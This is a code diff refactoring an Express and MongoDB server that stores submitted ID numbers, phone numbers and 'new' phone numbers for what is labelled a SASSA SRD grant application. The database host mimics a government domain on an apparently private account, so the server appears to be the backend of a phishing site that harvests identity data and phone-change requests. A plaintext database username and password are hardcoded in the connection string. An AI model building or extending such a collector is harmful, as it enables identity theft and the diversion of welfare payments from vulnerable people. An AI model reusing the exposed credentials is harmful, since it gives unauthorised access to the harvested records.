@@ -1,4 +1,4 @@
-
+// server.js
 const express = require('express');
 const cors = require('cors');
 const { MongoClient } = require('mongodb');
@@ -9,32 +9,40 @@ app.use(express.json());
 
 const uri = 'mongodb+srv://mkasigiven09:yGiI6nmIj33vDrhk@srd-sassa-gov-za.qnutzho.mongodb.net/sassa';
 const client = new MongoClient(uri);
+let collection;
 
-app.post('/submit', async (req, res) => {
-  const { idNumber, phoneNumber, newphoneNumber } = req.body;
-
+async function startServer() {
   try {
     await client.connect();
     const db = client.db('sassa');
-    const collection = db.collection('srd');
+    collection = db.collection('srd');
 
-    const exists = await collection.findOne({ idNumber, phoneNumber });
-    if (exists) return res.status(409).send('Duplicate application');
+    app.post('/submit', async (req, res) => {
+      const { idNumber, phoneNumber, newphoneNumber } = req.body;
 
-    await collection.insertOne({
-      idNumber,
-      phoneNumber,
-      newphoneNumber,
-      timestamp: new Date()
+      try {
+        const exists = await collection.findOne({ idNumber, phoneNumber });
+        if (exists) return res.status(409).send('Duplicate application');
+
+        await collection.insertOne({
+          idNumber,
+          phoneNumber,
+          newphoneNumber,
+          timestamp: new Date(),
+        });
+
+        res.status(200).send('Application submitted');
+      } catch (err) {
+        console.error(err);
+        res.status(500).send('Server error');
+      }
     });
 
-    res.status(200).send('Application submitted');
+    const PORT = process.env.PORT || 3000;
+    app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
   } catch (err) {
-    console.error(err);
-    res.status(500).send('Server error');
+    console.error('Failed to connect to DB:', err);
   }
-});
+}
 
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
-
+startServer();
